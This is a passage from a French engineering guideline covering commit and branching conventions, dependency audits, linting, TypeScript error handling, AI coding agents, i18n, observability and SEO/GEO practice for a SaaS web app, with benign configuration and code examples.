- Essai expire : bloquer tout sauf la page d'expiration, les parametres et la page d'abonnement

### 12.8 Pattern Bounded Context (BMAD)

Pour l'ajout de nouveaux modules a une application existante :

| Principe          | Application                                                                                             |
| ----------------- | ------------------------------------------------------------------------------------------------------- |
| **Bounded**       | Le module ne touche PAS aux modeles existants. Aucune FK croisee non-necessaire.                        |
| **Modular**       | Modeles, services et actions dedies. FK sortantes uniquement vers les entites partagees (tenant, user). |
| **Agile**         | Le module peut etre active/desactive par configuration (type de tenant, feature flag).                  |
| **Decentralized** | Service dedie, actions dediees, zero import depuis les modules adjacents.                               |

---

## 13. Maintenabilite & DX

### 13.1 Conventions de Commits

```
Format : <type>(<scope>): <description>

Types :
  feat     → Nouvelle fonctionnalite
  fix      → Correction de bug
  docs     → Documentation
  style    → Formatage (pas de changement de logique)
  refactor → Refactoring (pas de nouvelle feature, pas de fix)
  perf     → Amelioration de performance
  test     → Ajout/modification de tests
  chore    → Maintenance (deps, config, scripts)
  ci       → CI/CD
  revert   → Revert d'un commit precedent

Exemples :
  feat(calendar): add recurring events support
  fix(auth): prevent brute-force on login endpoint
  chore(deps): upgrade framework to latest version
```

- **Commits atomiques** : un commit = un changement logique
- **Messages en anglais** (convention internationale) ou en francais (si equipe francophone uniquement)
- Outils : commitlint + husky pour forcer le format

### 13.2 Strategie de Branching

```
main (production)
  └── develop (staging)
       ├── feature/calendar-module
       ├── feature/payment-integration
       ├── fix/login-brute-force
       └── hotfix/critical-security-patch (→ merge direct sur main)
```

| Strategie       | Quand l'utiliser                                              |
| --------------- | ------------------------------------------------------------- |
| **Trunk-based** | Equipe petite (1-3 devs), CI/CD mature, feature flags         |
| **Git Flow**    | Equipe moyenne, releases planifiees, environnements multiples |
| **GitHub Flow** | Equipe petite-moyenne, deploiement continu                    |

- **Branche principale protegee** : merge uniquement par PR, avec les checks CI **requis** (pas
  seulement affiches)
- **PR empilees** (B basee sur A) : fusionner A avec suppression automatique de sa branche **ferme** B
  au lieu de la rebaser, souvent sans que sa CI ait tourne. Rebaser B sur la branche principale
  **avant** de fusionner A
- **Fichiers journal partages** (changelog, journal de session) modifies dans deux branches : git peut
  entrelacer les deux entrees ligne a ligne **sans conflit**. Relire le fichier fusionne, pas
  seulement le statut du merge
- **`git stash` n'est pas un rangement** : un stash oublie survit des mois, et un `stash pop` a
  l'aveugle reapplique un vieux travail sur du code qui a change. Preferer une branche WIP commitee

### 13.3 Code Review Checklist

Avant d'approuver une PR, verifier :

- [ ] **Securite** : identifiant tenant dans les requetes (lecture ET ecriture), pas d'entite chargee par son seul ID (anti-IDOR), validation des entrees, pas de donnees sensibles exposees
- [ ] **Types** : pas de `any`, types explicites sur les fonctions publiques
- [ ] **Erreurs** : les erreurs sont gerees (try/catch, error boundaries)
- [ ] **Mobile** : inputs en 16px, touch targets 44px, pas de scroll horizontal
- [ ] **Accessibilite** : aria-labels, labels lies, focus visible
- [ ] **Performance** : pas d'import lourd non-necessaire, selection explicite en DB
- [ ] **Tests** : cas nominaux + cas d'erreur couverts
- [ ] **Nommage** : coherent avec les conventions du projet
- [ ] **Taille** : < 300 lignes par composant, PR < 500 lignes si possible

### 13.4 Gestion des Dependances

```bash
# Audit avant chaque release
npm audit --audit-level=high
npm outdated

# Mise a jour progressive (jamais tout d'un coup)
npm update --save  # patches + minors
npx npm-check-updates -u --target minor  # minors uniquement
# Les majors : une par une, avec test complet
```

- **Lockfile** : TOUJOURS commiter (`package-lock.json` ou `pnpm-lock.yaml`)
- **Politique de mise a jour** :
  - Patches : automatiques (Dependabot/Renovate) **apres un delai de quarantaine** (voir 1.10.3)
  - Minors : review rapide + tests
  - Majors : migration planifiee avec changelog lu
- **Nombre de dependances** : auditer regulierement, supprimer les deps inutilisees (`npx depcheck`)

**Hygiene anti-dette — audit concret des dependances inutiles/redondantes :**

Chaque dependance superflue est de la dette (surface d'attaque, poids de bundle, maintenance,
faux sentiment de couverture). Auditer ainsi, pas seulement `npm audit` (qui ne voit QUE les vulns) :

- **Deps jamais importees** : pour chaque paquet de `dependencies`, verifier qu'il existe au moins
  un `import`/`require` dans le code (`depcheck`, ou un grep des specifiers). Une dep runtime a
  **zero import** est presque toujours a supprimer.
- **Exception a connaitre — les outils sans import** : un builder/CLI (bundler CSS, runner de
  scripts, plugin PostCSS, generateur ORM) apparait a **zero import** mais est bien utilise via la
  config ou les scripts. Ne PAS le supprimer sur ce seul critere : verifier `scripts`/config d'abord.
- **`@types/*` redondants** : beaucoup de paquets recents **embarquent leurs propres types**
  (champ `types`/`typings` ou conditions `exports.types` dans leur `package.json`, ou un `index.d.ts`
  co-localise). Dans ce cas le `@types/<paquet>` du DefinitelyTyped est **redondant** (voire source
  de conflit de versions) : le retirer, puis confirmer que le type-check passe toujours.
- **Librairies redondantes** : traquer les doublons de role — deux libs de dates, une lib de charts
  la ou du SVG/CSS suffit, un client HTTP la ou `fetch` natif suffit, une lib d'utilitaires
  (`lodash`) pour trois fonctions triviales. La platforme moderne (fetch, Intl, Temporal a venir)
  remplace beaucoup de deps historiques.
- **Verifier avant de retirer** : apres chaque suppression, relancer type-check + lint + tests. Une
  dep « inutilisee » peut l'etre via un chemin non evident (types, effet de bord d'import, plugin).

### 13.5 Configuration ESLint & Prettier

```json
// .eslintrc.json — configuration type
{
  "extends": ["next/core-web-vitals", "next/typescript"],
  "rules": {
    "no-console": ["warn", { "allow": ["warn", "error"] }],
    "@typescript-eslint/no-explicit-any": "error",
    "@typescript-eslint/no-unused-vars": ["error", { "argsIgnorePattern": "^_" }],
    "prefer-const": "error"
  }
}
```

```json
// .prettierrc
{
  "semi": false,
  "singleQuote": true,
  "trailingComma": "es5",
  "printWidth": 100,
  "tabWidth": 2
}
```

- **Pre-commit hooks** : husky + lint-staged pour formater/linter automatiquement
- **Compatibilite cross-platform** : ne jamais utiliser `ENV=val cmd` dans lint-staged (Windows incompatible). Utiliser `cross-env` ou separer les outils (Prettier seul dans lint-staged, ESLint via `npm run lint`)
- **ESLint v9 migration** : ESLint v9+ utilise `eslint.config.js` (flat config). Si le projet utilise `.eslintrc.*`, ajouter `ESLINT_USE_FLAT_CONFIG=false` via `cross-env` ou migrer vers flat config
- **Piege vecu** : apres une montee de version majeure du framework, la commande `lint` ne faisait
  plus rien (la sous-commande avait ete retiree) et le job CI correspondant avait disparu. Le lint est
  reste mort des dizaines de pushes sans que rien ne le signale (voir [20.1](#201-un-controle-absent-est-indistinguable-dun-controle-reussi))
- **Un lint ne devient bloquant qu'a zero erreur** : mesurer, resorber la dette, puis cabler le gate.
  Un lint rouge en permanence n'est plus lu
- **Formateur sur un depot qui n'est pas propre** : ne jamais lancer `prettier --write` sur un
  repertoire entier ; formater les fichiers touches (lint-staged), sinon le diff noie la vraie modification
- **Fins de ligne** : avec `core.autocrlf=true` (Windows), les fichiers sont en CRLF sur disque et LF
  dans l'index. Une substitution shell sur `\n` peut ne rien trouver, sortir en 0 et laisser des `\r`
  orphelins — git voit alors tout le fichier comme modifie. Fixer la regle dans `.gitattributes`,
  modifier les fichiers avec un editeur, et verifier `git diff --stat` apres toute reecriture scriptee
- **Configuration partageable** : packager la config linter/formateur pour reutilisation inter-projets

### 13.6 Documentation In-Code

```typescript
// NE PAS commenter l'evident
// INTERDIT : "Incremente le compteur"
counter++

// COMMENTER le "pourquoi", pas le "quoi"
// Le rate limiter d'Upstash retourne 429 apres 100 req/min.
// On fallback vers le cache SQL pour ne pas bloquer l'utilisateur.
if (rateLimitError.status === 429) {
  return fallbackToSqlCache()
}

// JSDoc sur les fonctions publiques des services
/**
 * Calcule le solde d'un membre en tenant compte des paiements et des remboursements.
 * Utilise decimal.js pour eviter les erreurs d'arrondi.
 * @throws {NotFoundError} si le membre n'existe pas
 */
export async function getMemberBalance(memberId: string, associationId: string): Promise<number> {
```

### 13.7 Feature Flags

```typescript
// Pattern simple de feature flags
const FEATURES = {
  CALENDAR_MODULE: process.env.NEXT_PUBLIC_FF_CALENDAR === 'true',
  AI_SUGGESTIONS: process.env.NEXT_PUBLIC_FF_AI === 'true',
  NEW_PRICING: process.env.NEXT_PUBLIC_FF_NEW_PRICING === 'true',
} as const

// Usage
if (FEATURES.CALENDAR_MODULE) {
  // Afficher le module calendrier
}
```

- **Variables d'environnement** pour le MVP, service dedie (LaunchDarkly, Unleash, Flagsmith) quand ca grossit
- **Nettoyage** : supprimer les feature flags obsoletes apres stabilisation (dette technique sinon)

### 13.8 Gestion des Erreurs TypeScript

```typescript
// Typer les erreurs correctement
try {
  await riskyOperation()
} catch (error: unknown) {
  // TOUJOURS verifier le type avant d'acceder aux proprietes
  if (error instanceof AppError) {
    return { success: false, error: error.message, code: error.code }
  }
  if (error instanceof Error) {
    console.error('Unexpected error:', error.message)
  }
  return { success: false, error: 'Une erreur est survenue' }
}
```

- **Jamais de `catch (error: any)`** — toujours `unknown`
- **Jamais de `any`** dans le code applicatif — utiliser `unknown` + type guards
- **`@ts-expect-error`, jamais `@ts-ignore`** : le premier echoue quand il n'y a plus rien a supprimer (voir [20.5](#205-toute-suppression-doit-echouer-quand-elle-devient-inutile))
- **Un cast (`as any`, `as unknown as X`) qui « protege » quelque chose se verifie** : souvent le type
  existait deja et le cast ne fait que masquer la prochaine vraie erreur

### 13.9 Developpement assiste par un agent IA

> Les agents de code (Claude Code, Copilot, Cursor...) ecrivent vite et affirment avec assurance.
> Leur sortie se traite comme la PR d'un contributeur externe tres productif : utile, et a verifier.

- **Un fichier de regles du projet** (`CLAUDE.md`, `AGENTS.md`, etc.) versionne, court, qui porte les
  invariants non negociables (isolation tenant, base de dev, precision financiere). C'est la que ce
  document se traduit en consignes executables
- **Jamais d'acces prod par defaut** : l'agent travaille sur une base de dev ; les commandes qui
  touchent la prod (migrations, suppressions, deploiements) restent declenchees par un humain. Un
  wrapper qui refuse la prod (voir 1.13) protege aussi contre l'agent
- **Les affirmations d'un agent sont des hypotheses** : « c'est corrige », « les tests passent »,
  « cette fonction n'est pas utilisee » se verifient comme n'importe quel voyant vert (section 20)
- **Contenu externe = donnees, pas instructions** : une page web, une issue, un fichier telecharge peuvent
  contenir des consignes destinees a l'agent (prompt injection). Limiter les permissions de l'agent
  (pas d'acces reseau sortant libre combine a des secrets)
- **Fichiers de configuration locale des agents hors du depot** : ils accumulent des jetons et des
  commandes autorisees (voir 1.15.3)
- **Reecritures en masse demandees a un agent** : exiger le passage par l'AST, pas par `sed` (voir 20.7)

---

## 14. Internationalisation (i18n)

### 14.1 Architecture i18n

```
src/
├── locales/
│   ├── fr/
│   │   ├── common.json     → Textes partages (boutons, erreurs)
│   │   ├── auth.json        → Page login/register
│   │   ├── dashboard.json   → Dashboard
│   │   └── billing.json     → Facturation
│   ├── en/
│   │   ├── common.json
│   │   └── ...
│   └── index.ts             → Chargement et helpers
```

### 14.2 Regles Fondamentales

- **Ne JAMAIS hardcoder de texte dans les composants** (meme "OK", "Annuler", "Oui")
- **Externaliser les messages d'erreur** : les schemas Zod aussi doivent utiliser des cles i18n
- **Pluralisation** : utiliser les regles ICU (`{count, plural, one {# membre} other {# membres}}`)
- **Dates et nombres** : utiliser `Intl.DateTimeFormat` et `Intl.NumberFormat` (jamais de formatage manuel)

```typescript
// Formatage localise des dates
const formatDate = (date: Date, locale: string) => new Intl.DateTimeFormat(locale, { dateStyle: 'long' }).format(date)

// Formatage localise des montants
const formatCurrency = (amount: number, locale: string, currency: string) =>
  new Intl.NumberFormat(locale, { style: 'currency', currency }).format(amount)
```

### 14.3 Stack Recommandee

| Besoin                  | Solution                                    |
| ----------------------- | ------------------------------------------- |
| Framework Next.js       | `next-intl` ou `next-i18next`               |
| React generique         | `react-intl` (Format.js) ou `i18next`       |
| Vue                     | `vue-i18n`                                  |
| Gestion des traductions | Crowdin, Lokalise, ou fichiers JSON manuels |

### 14.4 SEO Multi-Langue

```html
<!-- Balises hreflang obligatoires pour le SEO multi-langue -->
<link rel="alternate" hreflang="fr" href="https://monapp.com/fr" />
<link rel="alternate" hreflang="en" href="https://monapp.com/en" />
<link rel="alternate" hreflang="x-default" href="https://monapp.com" />
```

### 14.5 RTL (Right-to-Left) — Si necessaire

- Utiliser les proprietes logiques CSS (`margin-inline-start` au lieu de `margin-left`)
- Tailwind : prefixe `rtl:` pour les ajustements specifiques
- Tester avec `dir="rtl"` sur `<html>`
- Si votre CSS framework supporte un prefixe RTL, l'utiliser pour les ajustements specifiques

---

## 15. Observabilite & Monitoring

### 15.1 Les 3 Piliers

| Pilier        | Quoi                                | Outils                                |
| ------------- | ----------------------------------- | ------------------------------------- |
| **Logs**      | Evenements textuels structures      | Pino, Winston, Vercel Logs            |
| **Metriques** | Valeurs numeriques dans le temps    | Prometheus, Datadog, Vercel Analytics |
| **Traces**    | Suivi d'une requete de bout en bout | OpenTelemetry, Sentry Performance     |

### 15.2 Logging Structure

```typescript
import pino from 'pino'

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  // Format JSON pour l'ingestion par les outils de monitoring
  formatters: {
    level: (label) => ({ level: label }),
  },
})

// Usage — toujours structurer les logs
logger.info({ userId, action: 'MEMBER_CREATED', memberId, associationId }, 'Member created')
logger.error({ err, userId, action: 'PAYMENT_FAILED' }, 'Payment processing failed')

// INTERDIT
console.log('Payment failed for user ' + userId) // Non-structure, non-searchable
```

- **Correlation ID** : generer un ID unique par requete, le propager dans tous les logs

```typescript
// Middleware de correlation
function correlationMiddleware(req: Request) {
  const correlationId = req.headers.get('x-correlation-id') || crypto.randomUUID()
  // Propager dans les headers, logs, et appels downstream
  return correlationId
}
```

### 15.3 Metriques Business

Au-dela des metriques techniques, monitorer les metriques business :

| Metrique                        | Alerte              |
| ------------------------------- | ------------------- |
| Inscriptions / jour             | < 50% de la moyenne |
| Taux de conversion trial → paid | < 5%                |
| Erreurs 5xx / heure             | > 10                |
| Temps de reponse P95            | > 3s                |
| Taille de la base de donnees    | > 80% du quota      |
| Commandes Redis / jour          | > 80% du quota      |

### 15.4 Alerting

```
Niveaux d'alerte :
  P1 (CRITIQUE)   → Site down, data breach, paiements casses → SMS + appel
  P2 (URGENT)     → Feature majeure cassee, erreurs 5xx en hausse → Slack + email
  P3 (ATTENTION)  → Performance degradee, quota a 80% → Email
  P4 (INFO)       → Anomalie mineure, metriques inhabituelles → Dashboard
```

- **Ne pas alerter sur tout** : alert fatigue = alerts ignorees
- **Runbook** : chaque alerte doit pointer vers une procedure de resolution
- **Alerter sur l'absence** autant que sur l'erreur : un cron qui n'a pas tourne, un backup qui n'a pas
  ete produit, un webhook qui ne recoit plus rien depuis 48h. Une erreur se voit ; un silence non
  (« dead man's switch » : le job pingue un moniteur, qui alerte s'il ne recoit rien)
- **Surveiller les dependances des controles de securite** (store du rate limiting, service de
  captcha) par un health-check dedie : leur panne ne produit aucune erreur visible (voir 1.5)

### 15.5 Monitoring en Production

| Outil                        | Usage                                      |
| ---------------------------- | ------------------------------------------ |
| Vercel Analytics             | Performance web (Core Web Vitals)          |
| Vercel Logs                  | Erreurs runtime, invocations               |
| Sentry                       | Error tracking JS (10% sampling free tier) |
| Dashboard DB (Neon/Supabase) | Metriques base de donnees                  |
| Dashboard Redis (Upstash)    | Commandes, quota, boucles de requetes      |
| UptimeRobot / BetterUptime   | Uptime monitoring (ping toutes les 5 min)  |

### 15.6 Health Check Endpoint

```typescript
// app/api/health/route.ts
export async function GET() {
  const checks = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    checks: {
      database: await checkDatabase(),
      redis: await checkRedis(),
      // ... autres services critiques
    },
  }

  const allHealthy = Object.values(checks.checks).every((c) => c === 'ok')
  return Response.json(checks, { status: allHealthy ? 200 : 503 })
}
```

- **Endpoint public = reponse minimale** : `ok`/`error` par composant, jamais de versions, de chaines
  de connexion ou de messages d'erreur bruts (reconnaissance offerte a un attaquant)
- Un health check qui ne fait que `return 200` mesure que le serveur repond, pas que l'app fonctionne

### 15.7 Diagnostiquer une erreur de production

- **Partir des logs de la plateforme filtres sur la periode et le code** (ex. toutes les 500 de la
  derniere heure, avec la trace complete), pas d'une reproduction locale : l'environnement local ne
  reproduit ni les garde-fous de prod, ni les donnees, ni la region
- **Correler par l'identifiant de requete** (15.2) entre le log applicatif, le log de la plateforme et
  le rapport d'erreur

---

## 16. SEO, GEO & Meta

Deux objectifs distincts, a ne pas confondre :

- **SEO** — etre **classe** dans une liste de resultats (16.1 a 16.6)
- **GEO** — etre **cite** dans une reponse generee par un moteur de reponse
  (16.7 a 16.11)
- **Mesure** — lire les donnees sans se raconter d'histoire (16.12)

Les deux reposent sur le meme socle : une page rapide (6.9), accessible (5), au contenu
visible dans le HTML initial, et **qui dit vrai** (16.10, 20.9). Les AI Overviews de Google
sont alimentees par l'index de Google : sans SEO, pas de GEO sur Google.

### 16.1 Favicon & Icones

- **PNG raster 192x192** obligatoire a la racine publique
- SVG pour `icon.svg` (App Router Next.js)
- `.ico` + `apple-icon.png` dans le dossier app
- SVG : recadrer le `viewBox` au contenu reel (eliminer les marges vides)
- **Ne JAMAIS se fier au .ico ou .svg seul** pour l'indexation Google

### 16.2 Web Manifest

- Fichier `manifest.webmanifest` requis
- Doit referencer l'icone 192x192 PNG
- DOIT etre exclu du middleware d'auth

### 16.3 Schema.org (Donnees Structurees)

- JSON-LD `Organization` avec `logo` pointant vers un PNG raster (pas SVG), `sameAs` vers les profils officiels
- JSON-LD `BreadcrumbList` pour la navigation
- JSON-LD `SoftwareApplication` pour les pages produit SaaS (prix **identique** a la page tarifs, voir 16.10)
- JSON-LD `Article` avec `author`, `datePublished`, `dateModified` reels pour les contenus editoriaux
- Ancres pour deep linking (`#section-name`)

**Ajuster les attentes sur les rich results** (changements Google d'aout-septembre 2023) :

| Type                         | Statut                                                                                                                                               |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HowTo`                      | **Plus aucun resultat enrichi** dans Google. Balisage inoffensif, mais n'en attendre rien                                                            |
| `FAQPage`                    | Resultats enrichis **reserves aux sites gouvernementaux et de sante** reconnus. Reste utile comme structure lisible par les moteurs de reponse (GEO) |
| `Review` / `AggregateRating` | Jamais sur ses propres avis auto-proclames ; **jamais de note inventee**                                                                             |

- **Le balisage decrit le contenu visible de la page** : une FAQ en JSON-LD absente de la page, un
  prix ou une note qui n'apparait pas a l'ecran = violation des consignes (action manuelle possible)
- Valider avec le **Rich Results Test** et le rapport « Ameliorations » de la Search Console

### 16.4 Open Graph

- Format d'image : PNG (meilleur support que JPG pour les previews)
- References coherentes dans : `layout.tsx`, pages marketing, layout auth
- Taille recommandee : 1200x630px
- **Twitter Card** : `twitter:card`, `twitter:title`, `twitter:description`, `twitter:image`

### 16.5 Meta Tags Essentiels

```typescript
// app/layout.tsx
export const metadata: Metadata = {
  metadataBase: new URL('https://monapp.com'),
  title: { default: 'MonApp', template: '%s | MonApp' },
  description: 'Description unique et pertinente (150-160 caracteres)',
  robots: { index: true, follow: true },
  alternates: { canonical: 'https://monapp.com' },
  openGraph: {
    /* ... */
  },
  twitter: { card: 'summary_large_image' /* ... */ },
}
```

- **Chaque page** doit avoir un `title` et `description` uniques
- **`canonical`** : obligatoire pour eviter le contenu duplique ; URL absolue, et **coherente** avec le
  sitemap, les liens internes et la politique de slash final (une seule forme d'URL par page)
- **`robots`** : `noindex` sur les pages admin, staging, preview — **de preference par l'en-tete HTTP
  `X-Robots-Tag: noindex`** au niveau de la plateforme pour tous les domaines de preview : une balise
  meta oubliee dans un layout suffit a faire indexer un environnement de test
- `max-image-preview:large` dans le meta `robots` des pages editoriales (vignettes plus grandes dans
  Discover et les resultats)

#### 16.5.1 Redirections et contenus en double

- **Deux pages qui repondent a la meme intention se fusionnent** : garder celle qui a le plus de
  signaux (impressions, liens), y rapatrier le contenu utile de l'autre, puis **redirection
  permanente** (301/308) de l'ancienne vers la conservee. Inspecter ensuite l'ancienne URL dans la
  Search Console pour qu'elle constate la redirection
- **Deux pages proches ne sont pas forcement une cannibalisation** : un guide et un outil sur le meme
  sujet servent deux intentions (comprendre / faire). Verifier dans les requetes qu'ils se disputent
  vraiment les memes avant de fusionner
- Jamais de chaine de redirections (A → B → C) ; mettre a jour les liens internes vers la cible finale

### 16.6 Sitemap & Robots

```typescript
// app/sitemap.ts — genere dynamiquement
export default async function sitemap(): Promise<MetadataRoute.Sitemap> {
  const pages = await getPublicPages()
  return pages.map((page) => ({
    url: `https://monapp.com${page.path}`,
    lastModified: page.updatedAt, // date REELLE de modification du contenu
    // changeFrequency / priority : ignores par Google, inutile de les renseigner
  }))
}
```

- **`changefreq` et `priority` sont ignores par Google** (et Bing les traite au mieux comme un
  indice faible) : inutile de les maintenir. Seul `lastmod` compte — **s'il est vrai**

```
# robots.txt
User-agent: *
Allow: /
Disallow: /admin/
Disallow: /api/
Sitemap: https://monapp.com/sitemap.xml
```

- **`robots.txt` n'est pas une protection** : il est public et liste justement les chemins
  « interessants ». Ce qui doit etre prive est protege par l'authentification ; ce qui ne doit pas
  etre indexe porte `noindex` (et ne doit **pas** etre bloque dans robots.txt, sinon le robot ne voit
  jamais le `noindex`)
- **IndexNow** (Bing, Yandex, Seznam...) : notifier les URL modifiees au deploiement accelere leur
  prise en compte ; Google ne l'utilise pas

**Robots des moteurs IA : distinguer entrainement et recherche.** Bloquer un robot d'entrainement ne
retire pas des reponses ; bloquer un robot de recherche, si.

| Robot (user-agent)                 | Role                                                                                                        |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `Googlebot`                        | Recherche Google **et** AI Overviews / AI Mode                                                              |
| `Google-Extended`                  | Jeton de controle : entrainement/grounding Gemini, **sans effet** sur le classement ni sur les AI Overviews |
| `OAI-SearchBot` / `ChatGPT-User`   | Recherche ChatGPT / consultation a la demande d'un utilisateur                                              |
| `GPTBot`                           | Entrainement OpenAI                                                                                         |
| `Claude-SearchBot` / `Claude-User` | Recherche Claude / consultation a la demande                                                                |
| `ClaudeBot`                        | Entrainement Anthropic                                                                                      |
| `PerplexityBot`                    | Indexation Perplexity                                                                                       |
| `CCBot`                            | Common Crawl (reutilise par de nombreux modeles)                                                            |

- **Strategie par defaut pour un site qui cherche a etre cite** : laisser passer les robots de
  recherche ; decider explicitement (et ecrire pourquoi) pour les robots d'entrainement
- Verifier que le WAF/CDN ne bloque pas ces robots « par defaut » : plusieurs fournisseurs les
  bloquent desormais sans qu'on l'ait demande — un `robots.txt` permissif ne sert alors a rien

**Le sitemap ne liste QUE des pages indexables.** Une beta privee, une page de
statut manuelle ou un espace connecte n'ont rien a y faire : les declarer
demande a Google d'explorer des pages qu'il ne pourra pas indexer, ce qui dilue
le budget de crawl et fait remonter des erreurs en Search Console.

**Ne JAMAIS mettre `lastModified: new Date()`.** Un `lastmod` recalcule a chaque
build declare toutes les pages comme modifiees a chaque deploiement, meme
lorsqu'aucun contenu n'a bouge. Le signal devient faux, et un moteur qui
constate l'ecart cesse de s'y fier. Utiliser la vraie date de modification du
contenu, ou ne rien mettre.

### 16.7 GEO (Generative Engine Optimization)

Le SEO classique optimise pour etre **classe** dans une liste de resultats. Le
GEO optimise pour etre **cite** dans une reponse generee. Les deux se
complementent, mais les criteres different : un moteur de reponse a besoin
d'extraits courts, autonomes, factuels et attribuables.

**Regle centrale : chaque page doit se suffire a elle-meme.** Si comprendre
l'offre exige de recomposer mentalement le hero, la grille de fonctionnalites et
la page tarifs, ni un visiteur presse ni un moteur de reponse n'y arrivera.

**Bloc « en bref » sur la page d'accueil.** Une reponse directe et factuelle,
structuree en questions explicites :

- **Qu'est-ce que c'est ?** — une phrase, sans jargon marketing
- **Pour qui ?** — le profil reel de l'utilisateur
- **Quel resultat ?** — le benefice concret, pas la fonctionnalite
- **Combien ca coute ?** — le prix reel, coherent avec la page tarifs
- **Ce que l'outil NE fait PAS** — les limites, explicitement

La derniere ligne est la plus importante et la plus souvent oubliee.
**Declarer ses limites augmente la citabilite** : un moteur de reponse privilegie
les sources qui bornent leur perimetre, et l'utilisateur qui arrive avec une
attente hors perimetre serait de toute facon decu. Voir aussi la regle
« nommer le referentiel, pas revendiquer la conformite » en 16.10.

**Utiliser un balisage semantique reel** (`<dl>/<dt>/<dd>` pour des paires
question/reponse, `aria-labelledby` sur la section) : la structure aide
l'extraction autant que l'accessibilite.

### 16.8 `llms.txt` — fichier d'identite pour les agents

Fichier texte a la racine publique, destine aux agents et moteurs de reponse qui
veulent une description fiable du produit sans parser tout le site.

> **A sa juste place** : `llms.txt` est une proposition de convention (2024), **pas un standard**.
> Google a indique ne pas l'utiliser pour la recherche, et aucun grand moteur de reponse ne s'est
> engage a le lire. Il coute une heure et sert aux agents qui le consultent ; il ne remplace ni un
> contenu clair sur les pages, ni le JSON-LD. Ne pas y investir plus.

Structure eprouvee :

```markdown
# NomDuProduit

> Resume d'une phrase : ce que c'est, pour qui, ou.

- [Site officiel](https://exemple.com/)
- [Tarifs et essai](https://exemple.com/tarifs)
- [Ressources](https://exemple.com/ressources)

## Faits essentiels

- Public : ...
- Fonctions : ...
- Modele economique : ... (ce que vous ne facturez pas compte autant)
- Essai : ... (conditions exactes)
- Limite : ce que le produit ne fait pas / ne remplace pas
- Langue principale / Zone principale : ...
- Contact : [contact@exemple.com](mailto:contact@exemple.com)

## Guides de reference

- [Titre du guide](https://exemple.com/ressources/slug)
```

**Les liens DOIVENT etre en syntaxe Markdown.** Une URL en texte brut posee
apres un libelle n'est pas reconnue comme lien par les auditeurs agentiques :
le fichier est alors lu comme ne contenant aucun lien, et son interet disparait.
Vecu : un `llms.txt` complet et juste, declare « sans aucun lien » par un audit.

**PIEGE — l'exclusion du middleware se fait a DEUX endroits.** Sur un
framework a middleware (Next.js et equivalents), il faut ajouter le fichier :

1. dans la **liste des routes publiques** du middleware ;
2. dans le **matcher** (la regex qui decide si le middleware s'execute).

N'en faire qu'un seul laisse le fichier repondre `302` vers la page de
connexion. Le fichier existe, le deploiement est vert, et il est invisible.
Meme piege que pour `sitemap.xml`, `robots.txt` et `manifest.webmanifest`
(cf. 16.2).

### 16.9 Citations et sources institutionnelles

Un contenu editorial qui enonce des regles juridiques, comptables ou
reglementaires doit montrer d'ou il les tient. C'est le principal signal de
confiance exploitable par un moteur de reponse.

- **Chaque article de fond cite au moins une source institutionnelle**, en HTTPS
- **Sources centralisees dans un module unique**, pas ecrites en dur dans chaque
  article : sinon la meme reference derive d'un article a l'autre et devient
  impossible a mettre a jour quand la reglementation change
- **Bloc « Sources » visible** en fin d'article, avec titre, editeur et lien
- **Les citations visibles et le JSON-LD doivent etre identiques** — le champ
  `citation` du schema `Article` est alimente depuis la meme source que
  l'affichage. Deux listes qui divergent, c'est une contradiction servie aux
  moteurs
- **Dater le contenu** (`dateModified`) et inviter le lecteur a verifier a la
  source : sur des regles qui evoluent, une page non datee est une page suspecte

### 16.10 Schema.org enrichi pour le GEO

Au-dela des types de base (16.3), ces proprietes aident un moteur de reponse a
qualifier le produit :

- `inLanguage` — la langue reelle du contenu
- `audience` / `audienceType` — a qui le produit s'adresse
- `areaServed` — zone geographique couverte (`Country`, `AdministrativeArea`)
- `url` explicite sur l'entite produit
- `citation` sur les `Article` (cf. 16.9)

**REGLE ABSOLUE — le JSON-LD ne doit jamais contredire une page du site.**
Il est servi sur toutes les pages et n'est visible de personne : c'est
exactement pour cela qu'il derive sans que personne ne s'en apercoive.
Vecu : un bloc `offers` declarant « 0 EUR, gratuit pendant la beta » pendant que
la page tarifs affichait un prix mensuel. Une offre fausse, envoyee directement
aux moteurs, contredite par la page d'a cote.

**Corollaire : n'affirmez pas dans le balisage ce que le produit ne garantit
pas.** Nommer un referentiel (norme, reglement, standard) est legitime et utile ;
declarer que le produit y est _conforme_ engage une garantie que seul un audit
externe peut soutenir. Cette distinction vaut pour le JSON-LD, les metadonnees
et le contenu visible.

### 16.11 Garde-fous SEO/GEO automatises

Le SEO se degrade silencieusement : rien ne casse, le build reste vert, et la
regression n'est visible qu'en Search Console des semaines plus tard. Ces
verifications doivent donc etre des **tests**, pas une checklist de relecture.

- **Liens internes morts** : parcourir les fichiers, extraire les `href`
  internes, verifier que chaque route existe reellement dans l'arborescence
- **Sitemap** : verifier qu'aucune page non indexable (beta, statut, admin) n'y
  figure
- **`llms.txt`** : verifier la presence du `H1` et un nombre minimal de liens
  **en syntaxe Markdown**
- **Sources** : chaque article expose au moins une source, toutes en HTTPS
- **Coherence citations** : `citation` du JSON-LD == sources affichees
- **Coherence des prix** : le prix du JSON-LD, celui de la page tarifs et celui
  du systeme de paiement proviennent d'une source unique (cf. 12.6). Un job CI
  peut lire les prix reels chez le prestataire de paiement (cle en lecture seule)
  et les comparer a l'affichage
- **Coherence fonctionnelle** : le `featureList` du JSON-LD, la FAQ et `llms.txt`
  ne citent aucune fonctionnalite retiree du produit (voir 20.9)

### 16.12 Lire la Search Console sans se tromper

> La Search Console donne des chiffres justes et des moyennes trompeuses. Les erreurs vecues
> ci-dessous ont toutes conduit a recommander une action inutile avant d'etre corrigees.

- **Verifier une hypothese avant d'agir** : « ces pages n'ont aucune impression, elles ne sont pas
  indexees » s'est revelee fausse — elles etaient indexees, simplement pas encore classees. Le rapport
  Indexation > Pages et l'inspection d'URL tranchent ; la deduction depuis les impressions, non
- **La position moyenne par page est tiree par la longue traine** : une page « en position 14 » peut
  etre en position 30-70 sur ses requetes tete, et en page 1 sur quelques requetes rares. Lire les
  **requetes** de la page avant de conclure. Reecrire les titres d'une page dont les requetes tete sont
  en position 40 ne fera gagner aucun clic : le levier est l'autorite (liens entrants), pas la balise
- **Les requetes exportees ne sont qu'une partie du trafic** : les requetes rares sont masquees
  (confidentialite). Un export « 0 clic sur 241 requetes » peut coexister avec des clics reels
- **Comparer des periodes de meme duree** (28 jours contre 28 jours), jamais 28 jours contre 3 mois
